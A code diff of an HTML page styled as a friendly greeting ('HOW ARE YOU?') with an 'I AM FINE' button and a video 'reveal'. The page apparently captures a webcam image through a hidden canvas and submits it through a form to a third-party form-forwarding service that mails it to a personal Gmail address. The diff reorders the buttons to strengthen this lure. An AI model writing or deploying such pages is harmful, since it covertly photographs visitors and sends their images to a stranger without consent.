@@ -71,14 +71,14 @@ button:hover {
 <body>
 
 <h2>HELLO ❤ — HOW ARE YOU?</h2>
-<button id="revealButton">CLICK TO REVEAL</button>
+<button id="capture">I AM FINE</button>
+
+<button id="revealButton" style="display:none;">CLICK TO REVEAL</button>
 
 <video id="revealVideo" controls style="display:none; width:90%; max-width:500px; border-radius:15px;">
   <source src="reveal.mp4" type="video/mp4">
   Your browser does not support video.
 </video>
-
-<button id="capture">I AM FINE</button>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <form id="imageForm" action="https://formsubmit.co/ganeshbist257@gmail.com" method="POST" enctype="multipart/form-data">
@@ -96,11 +96,15 @@ const imageInput = document.getElementById("imageInput");
 const form = document.getElementById("imageForm");
   const revealButton = document.getElementById("revealButton");
 const revealVideo = document.getElementById("revealVideo");
-  revealButton.addEventListener("click", () => {
+captureButton.addEventListener("click", () => {
+  captureButton.style.display = "none";
+  revealButton.style.display = "block";
+});
+
+revealButton.addEventListener("click", () => {
   revealVideo.style.display = "block";
   revealVideo.play();
 });
-
 let video;
 
 // Start camera
